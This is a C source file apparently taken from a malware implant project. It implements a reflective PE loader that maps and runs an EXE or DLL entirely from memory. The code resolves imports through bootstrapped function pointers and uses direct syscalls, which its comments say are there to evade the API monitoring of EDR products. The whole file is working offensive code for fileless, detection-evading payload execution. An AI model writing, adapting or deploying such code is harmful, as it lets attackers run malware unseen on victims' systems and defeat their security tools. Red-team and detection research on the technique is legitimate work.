/*
 * reflect.c — Reflective PE loader.
 *
 * Loads a raw PE image (EXE or DLL) into the current process entirely
 * from memory, without touching disk:
 *   1. Allocate RW memory for the image (prefer ImageBase, fall back anywhere)
 *   2. Copy PE headers + sections
 *   3. Apply base relocations (delta = allocated_base − preferred_base)
 *   4. Resolve import table via LoadLibraryA + GetProcAddress
 *   5. Execute TLS callbacks (DLL_PROCESS_ATTACH)
 *   6. Call entry point (DllMain for DLL, raw EP for EXE)
 *
 * All memory allocation goes through NtAlloc (direct syscall) to avoid
 * the VirtualAlloc IAT entry that EDRs monitor.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* ── Helpers ─────────────────────────────────────────────────────────────── */

/* Section characteristic → NT page protection */
static ULONG SectionProt(DWORD ch) {
    BOOL x = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL r = (ch & IMAGE_SCN_MEM_READ)    != 0;
    BOOL w = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
    if (x && w) return PAGE_EXECUTE_READWRITE;
    if (x && r) return PAGE_EXECUTE_READ;
    if (x)      return PAGE_EXECUTE;
    if (w)      return PAGE_READWRITE;
    return PAGE_READONLY;
}

/* ── Step 3: base relocations ─────────────────────────────────────────────── */

static void ApplyRelocs(BYTE *base, LONGLONG delta,
                        PIMAGE_DATA_DIRECTORY relDir) {
    if (!delta || !relDir->VirtualAddress || !relDir->Size) return;

    BYTE *p   = base + relDir->VirtualAddress;
    BYTE *end = p + relDir->Size;

    while (p < end) {
        PIMAGE_BASE_RELOCATION blk = (PIMAGE_BASE_RELOCATION)p;
        if (!blk->SizeOfBlock || blk->SizeOfBlock < sizeof(*blk)) break;

        DWORD count = (blk->SizeOfBlock - sizeof(*blk)) / sizeof(WORD);
        WORD *entries = (WORD*)(blk + 1);
        BYTE *page = base + blk->VirtualAddress;

        for (DWORD i = 0; i < count; i++) {
            int type   = (entries[i] >> 12) & 0xF;
            int offset = entries[i] & 0x0FFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                *(LONGLONG*)(page + offset) += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                *(DWORD*)(page + offset) += (DWORD)delta;
            }
            /* IMAGE_REL_BASED_ABSOLUTE (0) — padding, skip */
        }
        p += blk->SizeOfBlock;
    }
}

/* ── Step 4: import resolution ────────────────────────────────────────────── */

static BOOL ResolveImports(BYTE *base, PIMAGE_DATA_DIRECTORY impDir,
                            pfnLoadLibraryA_t pLL,
                            pfnGetProcAddress_t pGPA) {
    if (!impDir->VirtualAddress) return TRUE;

    PIMAGE_IMPORT_DESCRIPTOR imp =
        (PIMAGE_IMPORT_DESCRIPTOR)(base + impDir->VirtualAddress);

    for (; imp->Name; imp++) {
        const char *dllName = (const char*)(base + imp->Name);
        HMODULE hMod = pLL(dllName);
        if (!hMod) return FALSE;

        /* Original thunk (name table) and first thunk (IAT to patch) */
        ULONG_PTR *orig = (ULONG_PTR*)(base +
            (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        ULONG_PTR *iat  = (ULONG_PTR*)(base + imp->FirstThunk);

        for (; *orig; orig++, iat++) {
            FARPROC fn;
            if (IMAGE_SNAP_BY_ORDINAL(*orig)) {
                fn = pGPA(hMod, (LPCSTR)IMAGE_ORDINAL(*orig));
            } else {
                PIMAGE_IMPORT_BY_NAME ibn =
                    (PIMAGE_IMPORT_BY_NAME)(base + (*orig & ~IMAGE_ORDINAL_FLAG));
                fn = pGPA(hMod, (LPCSTR)ibn->Name);
            }
            if (!fn) return FALSE;
            *iat = (ULONG_PTR)fn;
        }
    }
    return TRUE;
}

/* ── Step 5: TLS callbacks ────────────────────────────────────────────────── */

static void RunTLS(BYTE *base, PIMAGE_DATA_DIRECTORY tlsDir) {
    if (!tlsDir->VirtualAddress) return;
    PIMAGE_TLS_DIRECTORY64 tls =
        (PIMAGE_TLS_DIRECTORY64)(base + tlsDir->VirtualAddress);
    if (!tls->AddressOfCallBacks) return;

    typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID, DWORD, PVOID);
    PIMAGE_TLS_CALLBACK *cb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    for (; *cb; cb++) {
        (*cb)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
    }
}

/* ── Public: ReflectiveLoad ───────────────────────────────────────────────── */

/*
 * ReflectiveLoad — map peData into memory and execute it.
 *
 * param   : passed to DllMain as lpReserved (or ignored for EXEs)
 * isDll   : TRUE  → call DllMain(base, DLL_PROCESS_ATTACH, param)
 *           FALSE → call EP(param) as a plain function (shellcode-style)
 *
 * Returns TRUE on success.
 */
BOOL ReflectiveLoad(const BYTE *peData, SIZE_T peSize, PVOID param, BOOL isDll) {
    (void)peSize;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)  return FALSE;

    /* Use bootstrapped function pointers — no static IAT entry needed */
    pfnLoadLibraryA_t   pLL  = (pfnLoadLibraryA_t)g_LoadLibraryA;
    pfnGetProcAddress_t pGPA = (pfnGetProcAddress_t)g_GetProcAddress;
    if (!pLL || !pGPA) return FALSE;

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

    /* Step 1 — allocate RW: try preferred base first, then anywhere.
     * RWX is avoided; per-section protections are applied after load. */
    PVOID base = (PVOID)nt->OptionalHeader.ImageBase;
    NTSTATUS st = NtAlloc((HANDLE)(LONG_PTR)-1, &base, imageSize,
                          PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        base = NULL;
        st = NtAlloc((HANDLE)(LONG_PTR)-1, &base, imageSize,
                     PAGE_READWRITE);
        if (!NT_SUCCESS(st)) return FALSE;
    }

    BYTE *img = (BYTE*)base;

    /* Step 2 — copy headers */
    memcpy(img, peData, nt->OptionalHeader.SizeOfHeaders);

    /* Step 2 — copy sections */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(
        (PIMAGE_NT_HEADERS)(img + dos->e_lfanew));
    WORD nSec = nt->FileHeader.NumberOfSections;
    for (WORD i = 0; i < nSec; i++) {
        if (!sec[i].SizeOfRawData) continue;
        memcpy(img + sec[i].VirtualAddress,
               peData + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    /* Step 3 — relocations */
    LONGLONG delta = (LONGLONG)img - (LONGLONG)nt->OptionalHeader.ImageBase;
    ApplyRelocs(img, delta,
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);

    /* Step 4 — imports */
    if (!ResolveImports(img,
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
            pLL, pGPA)) {
        NtFree((HANDLE)(LONG_PTR)-1, base);
        return FALSE;
    }

    /* Step 5 — TLS */
    RunTLS(img, &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);

    /* Step 5b — harden: apply per-section memory protections (RW → characteristic) */
    {
        PIMAGE_NT_HEADERS ntImg = (PIMAGE_NT_HEADERS)(img + ((PIMAGE_DOS_HEADER)img)->e_lfanew);
        PIMAGE_SECTION_HEADER secImg = IMAGE_FIRST_SECTION(ntImg);
        WORD nSecImg = ntImg->FileHeader.NumberOfSections;
        ULONG oldProt;
        /* headers → read-only */
        NtProtect((HANDLE)(LONG_PTR)-1, img,
                  ntImg->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProt);
        /* each section → its characteristic-derived protection */
        for (WORD i = 0; i < nSecImg; i++) {
            if (!secImg[i].VirtualAddress || !secImg[i].Misc.VirtualSize) continue;
            NtProtect((HANDLE)(LONG_PTR)-1,
                      img + secImg[i].VirtualAddress,
                      secImg[i].Misc.VirtualSize,
                      SectionProt(secImg[i].Characteristics),
                      &oldProt);
        }
    }

    /* Step 6 — entry point */
    DWORD epRVA = nt->OptionalHeader.AddressOfEntryPoint;
    if (!epRVA) return TRUE;  /* no EP — loaded for export use only */

    if (isDll) {
        typedef BOOL (WINAPI *pfnDllMain)(HINSTANCE, DWORD, LPVOID);
        pfnDllMain ep = (pfnDllMain)(img + epRVA);
        ep((HINSTANCE)img, DLL_PROCESS_ATTACH, param);
    } else {
        typedef VOID (*pfnEP)(PVOID);
        pfnEP ep = (pfnEP)(img + epRVA);
        ep(param);
    }
    return TRUE;
}
